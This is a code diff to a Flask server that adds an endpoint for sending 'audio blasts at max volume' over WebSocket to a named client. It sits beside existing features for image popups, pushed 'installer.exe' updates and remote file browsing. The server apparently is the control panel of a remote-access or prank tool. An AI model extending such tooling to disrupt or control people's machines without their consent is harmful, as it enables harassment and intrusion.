@@ -598,6 +598,9 @@ def set_command():
             log_detail = f"Image popup sent: {cap_match.group(1)}"
         else:
             log_detail = "Dispatched image popup to client"
+    elif "WMPlayer.OCX" in decoded or "run_audio" in decoded or "play_audio" in decoded:
+        op_type = "AUDIO"
+        log_detail = "Dispatched audio blast to client at max volume"
     elif "installer.exe" in decoded:
         op_type = "UPDATE"
         log_detail = "Dispatched client update to latest release binary"
@@ -635,6 +638,35 @@ def send_image():
     log_operation(username, "IMAGER", detail, "dispatched")
 
     return jsonify({"status": "success", "message": "Image sent over WebSocket"})
+
+
+@app.post("/api/audio")
+@require_password
+def send_audio():
+    data = request.get_json(silent=True) or {}
+    username = data.get("username")
+    audio_b64 = data.get("audio")
+    filename = (data.get("filename") or "audio.mp3").strip()
+    title = (data.get("title") or "").strip()
+
+    if not username or not is_safe_name(username):
+        return jsonify({"status": "error", "message": "Missing or invalid username"}), 400
+
+    if not audio_b64:
+        return jsonify({"status": "error", "message": "Missing audio data"}), 400
+
+    # Push to client room via WebSocket
+    socketio.emit(
+        "play_audio",
+        {"audio": audio_b64, "filename": filename, "title": title},
+        room=username,
+    )
+
+    # Log operation in database
+    detail = f"Audio blast sent ({filename}): {title}" if title else f"Audio blast sent ({filename}) at max volume"
+    log_operation(username, "AUDIO", detail, "dispatched")
+
+    return jsonify({"status": "success", "message": "Audio sent over WebSocket"})
 
 
 # ── File System / FTP Browser Routes ──
